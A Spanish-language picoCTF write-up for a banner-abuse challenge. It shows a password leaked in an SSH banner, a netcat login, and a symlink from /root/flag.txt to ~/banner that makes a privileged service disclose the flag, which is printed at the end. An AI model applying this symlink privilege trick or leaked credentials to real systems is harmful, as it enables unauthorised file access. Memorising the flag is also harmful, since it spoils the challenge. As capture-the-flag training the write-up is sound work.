## Description

Can you abuse the banner?

The server has been leaking some crucial information on `tethys.picoctf.net 58334`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 62033`. From the above information abuse the machine and find the flag in the /root directory.


## Hint

1. Do you know about symlinks?
2. Maybe some small password cracking or guessing

## Solution

La contraseña se obtiene al conectarse al servidor que ha estad filtrándose: 

```
nc tethys.picoctf.net 57125

Salida: SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```

Con la contraseña que se ha recibido me conecto al servidor: 

```
┌──(lalosan㉿lalosan)-[~/exam1p1]
└─$ nc tethys.picoctf.net 62033
*************************************
**************WELCOME****************
*************************************
what is the password? 
My_Passw@rd_@1234}
```

Contesto las siguientes preguntas para acceder al shell:

```
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
```

Ahora debemos ir al archivo de la bandera que se encuantr naen el cd/ root. Y observar si podemos leerlo.

```
player@challenge:/root$ cat flag 
cat flag 
cat: flag: No such file or directory
player@challenge:/root$ cat flag.txt    
cat flag.txt
cat: flag.txt: Permission denied

```

Se observa que no tenemos permiso para ver el archivo flag.txt. En las pistas nos dice que usamos los enlaces simbólicos, enlazando la flag para que ocupe el lugar del banner.

```
player@challenge:/root$ ln -s /root/flag.txt ~/banner
ln -s /root/flag.txt ~/banner
player@challenge:/root$ cat banner
cat banner
cat: banner: No such file or directory

```

Nos desconectamos y nos volvemos a conectar.

```
┌──(lalosan㉿lalosan)-[~/exam1p1]
└─$ nc tethys.picoctf.net 60860
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}
```
La aplicación estaba leyendo el banner desde el directorio home, por lo tanto se pude asumir que el programa tenía privilegios para leer el archivo al enlazarnos simbólicamente.